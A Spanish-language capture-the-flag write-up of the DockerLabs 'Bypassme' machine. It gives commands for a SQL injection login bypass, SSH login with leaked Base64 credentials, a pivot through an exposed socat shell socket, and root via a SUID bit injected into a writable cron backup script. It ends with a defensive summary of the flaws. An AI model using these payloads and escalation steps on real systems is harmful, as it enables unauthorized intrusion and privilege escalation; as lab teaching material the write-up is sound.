# Bypassme — DockerLabs (Fácil)

Hay máquinas que se resuelven con un solo golpe de suerte y otras que te obligan a encadenar varios fallos distintos, uno detrás de otro, hasta llegar a root. **Bypassme** es de las segundas: empieza con una inyección SQL de manual para saltarse un login, sigue con unos logs que no deberían ser públicos y termina con un socket UNIX y un script de backup mal protegido haciendo de puente hacia el usuario root. Ningún paso es especialmente complejo por separado, pero juntos forman una cadena de compromiso completa.

- **Dificultad:** Fácil
- **Plataforma:** DockerLabs

## Planteamiento

El objetivo es obtener acceso root completo a la máquina. La superficie expuesta es mínima —SSH y un servicio web con un formulario de login— así que el punto de entrada pasa necesariamente por la aplicación web. Una vez dentro como usuario de bajo privilegio, la escalada no es directa: hay que pivotar primero a un segundo usuario a través de un mecanismo de comunicación entre procesos poco habitual, y desde ahí abusar de un script que se ejecuta periódicamente con privilegios de root.

## Despliegue de la Máquina

Se descomprime el archivo proporcionado y se ejecuta el script de despliegue:

```bash
unzip bypassme.zip
sudo bash auto_deploy.sh bypassme.tar
```

Se valida que la máquina está activa:

```bash
ping -c1 172.17.0.2
```

## Reconocimiento

### 1. Escaneo de puertos

Escaneo completo de puertos TCP:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

Puertos abiertos identificados:

- **22/tcp** — SSH
- **80/tcp** — HTTP

Enumeración de versiones y servicios:

```bash
nmap -sCV -p22,80 172.17.0.2
```

### 2. Reconocimiento web

Al acceder a `http://172.17.0.2` se encuentra una aplicación web con formulario de inicio de sesión.

Fuzzing de directorios sobre la aplicación:

```bash
gobuster dir -u 'http://172.17.0.2/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .env,.php,.bak,.old,.zip,.txt -b 400 --exclude-length 0
```

Se detectan varios directorios, pero ninguno ofrece un vector de ataque directo en primera instancia.

## Explotación

### 1. Bypass de autenticación por inyección SQL

Probando distintas cargas sobre el formulario de login, se consigue saltar la autenticación con una inyección clásica:

```sql
admin' OR '1'='1' -- -
```

Esto permite iniciar sesión como el usuario `admin` sin conocer la contraseña real.

### 2. Exposición de logs con credenciales

Ya dentro de la aplicación, la interfaz da indicios de la existencia de un sistema de logs accesible. Tras probar varias rutas se consigue acceder directamente a:

```
http://172.17.0.2/index.php?page=logs/logs.txt
```

El archivo contiene múltiples intentos de autenticación registrados. Solo uno tiene éxito, y su contraseña aparece codificada en Base64:

```
NGxiM3J0MTIz
```

Al decodificarla se obtiene:

```
4lb3rt123
```

Curiosamente, para el acceso por SSH funciona la cadena en Base64 tal cual, sin decodificar.

### 3. Acceso por SSH

```bash
ssh albert@172.17.0.2
```

Usando la cadena Base64 como contraseña se obtiene acceso como el usuario `albert`.

### 4. Movimiento lateral hacia el usuario `conx`

Ya dentro como `albert`, se enumera el sistema:

```bash
whoami
cat /etc/passwd | grep sh$
ps aux
```

Se identifica la existencia del usuario `conx` y, entre los procesos activos, un socket UNIX expuesto:

```
socat UNIX-LISTEN:/home/conx/.cache/.sock,fork EXEC:/bin/bash
```

Ese socket entrega una shell directamente asociada al usuario `conx`, sin necesidad de credenciales. Basta con conectarse a él:

```bash
socat - UNIX-CONNECT:/home/conx/.cache/.sock
```

Y estabilizar la shell obtenida:

```bash
script -c bash /dev/null
```

Con esto se consigue acceso efectivo como `conx`.

### 5. Escalada a root vía script de backup

Como `conx`, se localiza un script con permisos elevados:

```bash
/var/backups/backup.sh
```

Se comprueba que dicho script es ejecutado periódicamente por root mediante una tarea cron, y que además es modificable por el usuario actual. Se aprovecha esto para inyectar una línea que otorgue el bit SUID a `/bin/bash`:

```bash
echo "chmod u+s /bin/bash" >> /var/backups/backup.sh
```

Tras esperar a que el cron ejecute el script, se valida el cambio:

```bash
ls -l /bin/bash
```

```
-rwsr-xr-x 1 root root /bin/bash
```

### 6. Escalada final

Con el bit SUID activo, se obtiene una shell con privilegios de root:

```bash
bash -p
whoami
```

```
root
```

## Resumen de Credenciales

| Usuario | Contraseña / Valor                | Vía de obtención                                        |
|---------|-------------------------------------|-----------------------------------------------------------|
| admin   | (bypass, sin contraseña real)       | Inyección SQL en el login: `admin' OR '1'='1' -- -`        |
| albert  | `NGxiM3J0MTIz` (Base64, usado tal cual en SSH) | Log de intentos de autenticación expuesto en `logs.txt`   |
| conx    | (sin contraseña, acceso vía socket) | Socket UNIX expuesto: `/home/conx/.cache/.sock`             |
| root    | (SUID en bash)                      | Script `backup.sh` modificable, ejecutado por cron como root |

## Qué falló aquí

- **Inyección SQL en el login:** el formulario de autenticación no sanitiza ni parametriza la entrada del usuario, permitiendo alterar la lógica de la consulta y saltarse la autenticación por completo.
- **Exposición de logs sensibles:** un archivo de logs accesible públicamente a través de un parámetro de la propia aplicación (`?page=logs/logs.txt`) filtraba intentos de login, incluyendo una credencial válida codificada de forma trivial (Base64), que además funcionaba directamente como contraseña sin decodificar.
- **Servicio de shell expuesto sin autenticación:** el socket UNIX de `conx` entrega una shell interactiva a cualquier proceso capaz de conectarse a él, sin ningún control de acceso. Es, en la práctica, una puerta trasera sin contraseña.
- **Script privilegiado con permisos de escritura débiles:** `backup.sh` se ejecuta como root vía cron pero es modificable por un usuario sin privilegios, lo que permite inyectar comandos arbitrarios que se ejecutarán con permisos elevados en la siguiente ejecución programada.

---

⚠️ Este contenido es exclusivamente educativo. No debe aplicarse en entornos reales sin autorización explícita.
